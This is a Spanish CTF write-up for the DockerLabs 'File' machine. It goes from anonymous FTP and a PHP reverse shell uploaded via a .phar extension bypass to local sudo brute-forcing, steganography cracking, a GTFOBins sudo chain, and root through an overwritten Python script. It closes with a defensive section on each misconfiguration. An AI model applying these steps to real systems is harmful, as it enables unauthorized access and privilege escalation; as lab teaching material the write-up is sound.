# File (DockerLabs) — Writeup

Dificultad: Facil

Si las máquinas anteriores eran ejercicios de un solo truco, esta es la fiesta completa: FTP anónimo, criptografía clásica, fuzzing web con bypass de filtro, fuerza bruta de contraseñas de sudo a nivel local, esteganografía en una imagen, y para rematar, una cadena de sudo de tres saltos que termina con un script Python reescrito sobre la marcha. Es de esas máquinas que, más que enseñar una técnica concreta, enseñan a no rendirse cuando el primer, segundo y hasta tercer callejón parecen sin salida.

---

## Planteamiento

El hilo conductor de todo el reto es este: cada pista lleva a la siguiente, pero casi nunca de forma directa. El FTP da un usuario, pero no una contraseña utilizable de inmediato. La web da un directorio de subida, pero con un filtro que hay que sortear. Y una vez dentro, el camino a root no es un solo salto sino tres, cada uno con su propio binario abusable. Ideal para practicar paciencia tanto como técnica.

---

## Paso 1: reconocimiento de puertos

Un escaneo estándar con Nmap revela dos servicios:

- **21/tcp** — FTP
- **80/tcp** — HTTP

Nada sorprendente todavía, la combinación clásica de "algo para filtrar información" más "algo para explotar".

---

## Paso 2: el FTP anónimo entrega un usuario, envuelto en cifrado

El login anónimo está permitido sin problema. Dentro hay un archivo `.txt` que, al descargarlo y abrirlo, no contiene texto legible sino una cadena cifrada.

En vez de intentar identificar manualmente el algoritmo, se recurre a Crackstation, un servicio online que mantiene bases de datos masivas de hashes ya descifrados previamente — perfecto para cifrados o hashes débiles usados en retos de este estilo. El resultado apunta a un nombre de usuario: **Justin**.

Con esto en la mano, hay un candidato a cuenta del sistema, pero todavía sin contraseña. Toca seguir tirando del hilo por otro lado.

---

## Paso 3: la web esconde su pista en el sitio de siempre

La página principal, a simple vista, no ofrece nada de interés. Pero el código fuente sí tiene algo que decir: un comentario HTML sugiriendo, sin ser muy sutil al respecto, que existe un directorio oculto en algún lugar del sitio.

Con esa pista, toca fuzzing de directorios con Gobuster, que da con dos hallazgos relevantes:

- Un directorio donde se almacenan archivos (probablemente un repositorio de subidas anteriores).
- Un directorio que **permite subir archivos** directamente.

Con un punto de subida confirmado, el plan se escribe casi solo: generar una reverse shell en PHP y colarla ahí.

---

## Paso 4: el filtro de subida, y el clásico bypass de extensión

Usando un generador de payloads (revshells.com), se genera una reverse shell PHP y se intenta subir tal cual. Rechazada — el formulario bloquea la extensión `.php`.

La solución, ya vista en más de un reto de este estilo, es renombrar el archivo con una extensión que el servidor siga interpretando como código PHP pero que la validación no contemple:

```bash
mv revshell.php revshell.phar
```

Esta vez sí, la subida se completa sin problema. El filtro estaba pensado para bloquear la extensión obvia, pero no cubría variantes menos comunes que Apache con mod_php sigue ejecutando igualmente.

Con el archivo alojado en el directorio de subidas, se levanta un listener en el puerto correspondiente y se visita la ruta del archivo subido para disparar la ejecución. La conexión llega, y el acceso queda confirmado como **www-data**, el usuario habitual del servidor web.

Como siempre en este punto, toca el tratamiento de TTY para tener una consola cómoda antes de seguir enumerando.

---

## Paso 5: cuando la enumeración estándar no da nada

Con acceso inicial confirmado, tocan los pasos rutinarios de cualquier escalada de privilegios:

```bash
sudo -l
```

La respuesta pide contraseña — sin credenciales, este camino queda cerrado por ahora.

```bash
find / -perm -4000 -type f 2>/dev/null
```

Búsqueda de binarios SUID, sin ningún resultado aprovechable.

En este punto, muchas máquinas fáciles ya estarían resueltas. Aquí no: hay que seguir buscando en otra dirección.

---

## Paso 6: fuerza bruta local contra las contraseñas de sudo de otros usuarios

Revisando `/home` aparecen varios usuarios del sistema. Dado que no hay ni permisos sudo directos ni binarios SUID aprovechables, la siguiente jugada es intentar fuerza bruta contra las contraseñas locales de esos usuarios, usando la herramienta **Sudo_BruteForce** (de Mario, disponible en GitHub), diseñada específicamente para probar contraseñas de sudo desde dentro de una máquina ya comprometida.

El proceso de transferencia sigue el patrón habitual en este tipo de situaciones:

```bash
# En la máquina atacante
python3 -m http.server 8000
```

```bash
# En la máquina víctima
wget http://<IP-atacante>:8000/Sudo_BruteForce
wget http://<IP-atacante>:8000/rockyou.txt
chmod +x Sudo_BruteForce
```

Se ejecuta la herramienta contra los usuarios detectados en `/home`, y contra el usuario **Fernando** se obtiene una contraseña válida. Con ella:

```bash
su fernando
```

Segundo usuario del sistema conseguido, esta vez por fuerza bruta local en lugar de por pista textual.

---

## Paso 7: una imagen que no es solo una imagen

En el directorio personal de Fernando aparece un archivo de imagen. Nada indica a simple vista que contenga algo más allá de píxeles, así que toca transferirla a la máquina atacante y analizarla con herramientas de esteganografía.

```bash
stegcracker imagen.jpg rockyou.txt
```

Stegcracker combina la técnica de esteganografía **steghide** con un ataque de diccionario sobre la contraseña de extracción, probando automáticamente cada palabra del diccionario hasta encontrar la que permite extraer el contenido oculto. El resultado revela un mensaje — de nuevo cifrado, continuando con el patrón de esta máquina de nunca entregar nada en texto plano a la primera.

Otra vez a Crackstation, y esta vez el resultado es una contraseña directamente utilizable.

---

## Paso 8: probando la contraseña contra el elenco de usuarios hasta dar con el bueno

Con una contraseña en mano pero sin saber a qué usuario pertenece, se prueba contra los distintos usuarios del sistema detectados anteriormente. El acierto llega con **Mario**.

```bash
su mario
```

Tercer usuario conseguido — y este es justo el que destapa la cadena final de escalada.

---

## Paso 9: la cadena de sudo — tres saltos consecutivos hasta root

Aquí la máquina se pone seria de verdad. Comprobando sudo con cada usuario nuevo, se revela una cadena completa:

- **Mario** puede ejecutar un binario concreto como el usuario **Julen**.
- Consultando ese binario en GTFOBins, aparece la técnica de escape correspondiente, permitiendo el salto.
- **Julen**, a su vez, puede ejecutar otro binario como el usuario **Iker**.
- De nuevo GTFOBins confirma la vía de escape, y se salta a Iker.
- **Iker**, finalmente, puede ejecutar un script como **root** sin contraseña.

Tres eslabones seguidos, cada uno resuelto con la misma lógica: revisar `sudo -l`, identificar el binario permitido, buscarlo en GTFOBins, y aplicar la técnica de escape documentada para ese binario concreto. Es la demostración perfecta de por qué GTFOBins es una herramienta de cabecera en cualquier escalada de privilegios en Linux — cubre prácticamente cualquier binario que pueda usarse para saltar de contexto.

---

## Paso 10: el salto final — reescribiendo un script Python sobre la marcha

El último eslabón de la cadena es un script en Python que Iker puede ejecutar como root sin contraseña. En vez de intentar abusar de su lógica interna, la vía más directa es sustituirlo por completo:

```bash
rm script.py
cat > script.py << 'EOF'
import os
os.system("/bin/bash")
EOF
```

Al ejecutarlo con privilegios de root (dado que la regla de sudo permite correr ese script sin contraseña, y sudo no verifica que el contenido del archivo sea el mismo que cuando se concedió el permiso), el `os.system` lanza directamente una shell de bash heredando esos privilegios:

```bash
sudo /usr/bin/python3 script.py
```

Root conseguido. Un vistazo rápido a `/root` confirma el acceso completo, con la flag correspondiente esperando dentro.

---

## Resumen técnico

| Fase | Técnica |
|---|---|
| Pista inicial | FTP anónimo + texto cifrado → usuario Justin (vía Crackstation) |
| Vector web | Comentario HTML → directorio oculto → formulario de subida |
| Bypass de filtro | Renombrado de extensión `.php` → `.phar` |
| Acceso inicial | Reverse shell PHP → usuario www-data |
| Segundo usuario | Fuerza bruta local de sudo con Sudo_BruteForce → Fernando |
| Tercer usuario | Esteganografía (stegcracker) + Crackstation → contraseña → Mario |
| Cadena de escalada | Mario → Julen → Iker, cada salto vía binario documentado en GTFOBins |
| Escalada final | Reescritura de script Python ejecutable como root sin contraseña |

---

## Qué falló aquí (y cómo se evita)

1. **FTP anónimo exponiendo información, aunque estuviera cifrada.** Cifrar un dato no lo hace inaccesible si el cifrado es débil o conocido — solo añade un paso más al atacante, no una barrera real. La solución de fondo es no exponer esa información en absoluto, ni siquiera ofuscada.
2. **Validación de subida de archivos por lista negra de extensiones.** El mismo patrón visto en otras máquinas: bloquear la extensión obvia sin cubrir variantes que el servidor sigue ejecutando igual.
3. **Contraseñas de sudo débiles y reutilizables mediante fuerza bruta local.** Que una herramienta como Sudo_BruteForce pueda encontrar la contraseña de un usuario del sistema en un tiempo razonable indica contraseñas muy por debajo del estándar mínimo recomendado.
4. **Información sensible escondida mediante esteganografía en vez de eliminada.** Ocultar una contraseña dentro de una imagen no es una medida de seguridad real — es, en el mejor de los casos, ofuscación, y las herramientas de fuerza bruta contra esteganografía llevan años siendo efectivas contra contraseñas de diccionario.
5. **Cadena completa de reglas de sudo mal delimitadas entre múltiples usuarios.** Cada salto de la cadena (Mario → Julen → Iker → root) representa una regla de sudo que debería haberse revisado individualmente contra GTFOBins antes de aplicarse. Una sola regla mal configurada ya es grave; tres seguidas convierten cualquier compromiso inicial en compromiso total casi garantizado.
6. **Sudo permitiendo ejecutar un script sin verificar su integridad.** Conceder permiso de sudo sobre un script propio (a diferencia de un binario del sistema) es especialmente peligroso si el usuario autorizado tiene también permisos de escritura sobre ese mismo archivo: el script puede sustituirse por completo antes de ejecutarlo con privilegios elevados.

---

## Conclusión

Este laboratorio no falla por un único error, sino por la acumulación de varios, cada uno aparentemente menor por separado. Un FTP anónimo con datos cifrados, un filtro de subida incompleto, contraseñas débiles, un secreto escondido en una imagen y una cadena de sudo sin revisar entre varios usuarios: ninguno de estos fallos por sí solo sería necesariamente crítico, pero encadenados construyen un camino perfectamente transitable desde acceso anónimo hasta control total como root. La lección de fondo, una vez más, es que la seguridad se rompe casi siempre por la suma de pequeños descuidos, no por un único fallo catastrófico.

---

## Referencias

- Crackstation: https://crackstation.net/
- GTFOBins: https://gtfobins.github.io/
- Sudo_BruteForce (Maalfer): https://github.com/Maalfer/Sudo_BruteForce
- revshells.com: https://www.revshells.com/
- stegcracker: https://github.com/Paradoxis/StegCracker
- DockerLabs: https://dockerlabs.es/
